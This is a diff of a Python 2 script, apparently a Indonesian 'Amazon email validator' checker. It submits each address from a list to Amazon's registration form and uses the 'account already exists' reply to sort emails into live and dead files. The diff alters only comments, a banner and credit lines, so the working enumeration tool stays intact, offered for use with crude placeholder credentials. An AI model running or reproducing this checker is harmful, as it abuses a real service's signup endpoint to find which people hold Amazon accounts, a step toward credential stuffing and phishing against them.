@@ -1,21 +1,11 @@
 import requests
 
-# Ⓓ③ⓝ③ⓣⓢⓟ③ⓣⒾⒹⒾ
-# recorde by https://www.facebook.com/N05t4L914
-# open cmd klik c:/ install requests for supporr cli
-# dowoad python2 for support cli
+# Jangan Di Recode Ya Bossku
+# Tinggal  Make Aja Apa Susahnya Sih :)
+# options output live dan die
 
 live = open('Amz-Live.txt','w')
 die = open('Amz-Die.txt','w')
-
-print('''
-
-  ___ ____ _____   _                                   ___ ____  
- |_ _|  _ \___ /  / \   _ __ ___   __ _ _______  _ __ |_ _|  _ \ 
-  | || | | ||_ \ / _ \ | '_ ` _ \ / _` |_  / _ \| '_ \ | || | | |
-  | || |_| |__) / ___ \| | | | | | (_| |/ / (_) | | | || || |_| |
- |___|____/____/_/   \_\_| |_| |_|\__,_/___\___/|_| |_|___|____/ 
-                                                                 ''')
 
 list = raw_input("\033[33;1mInput Mail List : \033[0m")
 link = "https://www.amazon.com/ap/register%3Fopenid.assoc_handle%3Dsmallparts_amazon%26openid.identity%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%252Fidentifier_select%26openid.ns%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%26openid.claimed_id%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%252Fidentifier_select%26openid.return_to%3Dhttps%253A%252F%252Fwww.smallparts.com%252Fsignin%26marketPlaceId%3DA2YBZOQLHY23UT%26clientContext%3D187-1331220-8510307%26pageId%3Dauthportal_register%26openid.mode%3Dcheckid_setup%26siteState%3DfinalReturnToUrl%253Dhttps%25253A%25252F%25252Fwww.smallparts.com%25252Fcontactus%25252F187-1331220-8510307%25253FappAction%25253DContactUsLanding%252526pf_rd_m%25253DA2LPUKX2E7NPQV%252526appActionToken%25253DlptkeUQfbhoOU3v4ShyMQLid53Yj3D%252526ie%25253DUTF8%252Cregist%253Dtrue"
@@ -32,11 +22,11 @@ while True:
 	xxx = {'customerName':'Androsex','email': bacot[0],'emailCheck': bacot[0],'password':'Kontol1337','passwordCheck':'Kontol1337'}
 	cek = s.post(link, headers=head, data=xxx).text
 	if "You indicated you are a new customer, but an account already exists with the e-mail" in cek:
-		print("\033[32;1mLIVE\033[0m | "+email+" |[ID3][ Amazon Validator Email ][ID]")
+		print("\033[32;1mLIVE\033[0m | "+email+" | [Amz Email ]")
 		live.write(email)
 	else:
-		print("\033[31;1mDIE\033[0m | "+email+" |[ID3][ Amazon Validor Email ][ID]")
+		print("\033[31;1mDIE\033[0m | "+email+" | [ Amz Email ]")
 		die.write(email)
 print("-"*50)
-print("\033[35;1mProccess Checking Done By Ⓓ③ⓝ③ⓣⓢⓟ③ⓣⒾⒹⒾ - ./Xi4u7\033[0m")
+print("\033[35;1mProccess Checking Done By id3 - ./Xi4u7\033[0m")
 print("Valid Email Saved In : Amz-Live.txt\nDie Email Saved In : Amz-Die.txt")
